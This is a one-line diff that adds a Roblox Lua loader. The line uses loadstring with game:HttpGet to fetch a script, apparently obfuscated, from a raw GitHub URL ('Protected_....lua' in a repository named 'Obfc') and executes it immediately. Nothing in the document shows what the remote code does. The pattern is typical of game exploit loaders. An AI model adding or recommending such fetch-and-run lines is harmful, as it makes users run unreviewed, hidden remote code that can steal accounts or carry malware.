@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SPDMJakey/Obfc/main/Protected_2499070619554804.lua", true))()
